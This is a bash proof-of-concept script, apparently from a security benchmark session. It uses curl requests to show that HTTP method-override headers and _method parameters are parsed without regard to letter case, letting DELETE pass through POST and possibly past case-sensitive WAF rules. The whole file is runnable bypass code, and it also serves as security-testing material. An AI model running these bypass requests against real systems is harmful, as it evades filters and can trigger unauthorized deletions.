#!/bin/bash
# POC: Demonstrates case-insensitive HTTP method override parsing enabling WAF bypass through header name and value case variations (v2 with POST data)
# Target: ./repo
# Created: 2025-11-07T22:02:44.532Z
# Session: benchmark-XBEN-077-24-mhpdz86a

# Case-Insensitive HTTP Method Override Parsing - WAF Bypass POC (v2)
# This POC demonstrates how case variations in method override headers and values
# can bypass WAF/security rules that rely on case-sensitive pattern matching
# Updated to include POST data to avoid 422 errors

TARGET="${1:-http://localhost:3000}"
ENDPOINT="/"

echo "=========================================="
echo "HTTP Method Override Case-Insensitivity POC"
echo "Target: $TARGET"
echo "=========================================="
echo ""

# Test 1: Verify DELETE is blocked without override
echo "[*] Test 1: Verify direct DELETE request is blocked (405 expected)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X DELETE "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "Direct DELETE request HTTP status: $HTTP_CODE"
if [ "$HTTP_CODE" = "405" ]; then
    echo "✓ Confirmed: Direct DELETE is blocked"
else
    echo "✗ Note: Direct DELETE returned $HTTP_CODE (expected 405, but may vary)"
fi
echo ""

# Test 2: Header name case variations
echo "[*] Test 2: Testing header name case variations (case-insensitive)"
echo "These should all succeed (200) if parsing is case-insensitive:"
echo ""

echo "  2a) Lowercase header: x-http-method-override"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "x-http-method-override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

echo "  2b) Uppercase header: X-HTTP-METHOD-OVERRIDE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-METHOD-OVERRIDE: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

echo "  2c) Mixed case header: X-Http-Method-Override"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-Http-Method-Override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

# Test 3: Header value case variations
echo "[*] Test 3: Testing header value case variations (case-insensitive)"
echo "These should all succeed (200) if parsing is case-insensitive:"
echo ""

echo "  3a) Lowercase method value: delete"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-Method-Override: delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive value parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

echo "  3b) Uppercase method value: DELETE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-Method-Override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive value parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

echo "  3c) Mixed case method value: Delete"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-Method-Override: Delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive value parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

# Test 4: Query parameter case variations
echo "[*] Test 4: Testing query parameter case variations (case-insensitive)"
echo "These should all succeed (200) if parsing is case-insensitive:"
echo ""

echo "  4a) Lowercase parameter: _method=delete"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT?_method=delete" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive parameter parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

echo "  4b) Uppercase parameter name and value: _METHOD=DELETE"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT?_METHOD=DELETE" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ Case-insensitive parameter parsing confirmed" || echo "     Status: $HTTP_CODE"
echo ""

# Test 5: WAF bypass scenario simulation
echo "[*] Test 5: WAF Bypass Scenario Simulation"
echo "If a WAF rule blocks 'X-HTTP-METHOD-OVERRIDE: DELETE', these variations may bypass it:"
echo ""

echo "  5a) Bypass attempt 1: x-http-method-override (lowercase header)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "x-http-method-override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ WAF bypass possible through header case variation" || echo "     Status: $HTTP_CODE"
echo ""

echo "  5b) Bypass attempt 2: X-HTTP-Method-Override: delete (lowercase value)"
RESPONSE=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-Method-Override: delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
echo "     HTTP Status: $HTTP_CODE"
[ "$HTTP_CODE" = "200" ] && echo "     ✓ WAF bypass possible through value case variation" || echo "     Status: $HTTP_CODE"
echo ""

# Test 6: Confirm case-insensitivity by checking multiple variations return same result
echo "[*] Test 6: Case-Insensitivity Consistency Check"
echo "Verifying that different case variations produce consistent results:"
echo ""

# Collect responses from different cases
RESPONSE_1=$(curl -s -w "\n%{http_code}" -X POST -H "X-HTTP-Method-Override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null | tail -n1)

RESPONSE_2=$(curl -s -w "\n%{http_code}" -X POST -H "x-http-method-override: DELETE" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null | tail -n1)

RESPONSE_3=$(curl -s -w "\n%{http_code}" -X POST -H "X-Http-Method-Override: delete" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "name=test&bio=test" \
  "$TARGET$ENDPOINT" 2>/dev/null | tail -n1)

echo "  Standard case (X-HTTP-Method-Override: DELETE): $RESPONSE_1"
echo "  Lowercase case (x-http-method-override: DELETE): $RESPONSE_2"
echo "  Mixed case (X-Http-Method-Override: delete): $RESPONSE_3"

if [ "$RESPONSE_1" = "$RESPONSE_2" ] && [ "$RESPONSE_2" = "$RESPONSE_3" ]; then
    echo "  ✓ All variations return same status code - case-insensitive parsing confirmed"
else
    echo "  Note: Different responses may indicate case-sensitive parsing"
fi
echo ""

echo "=========================================="
echo "POC Complete"
echo "=========================================="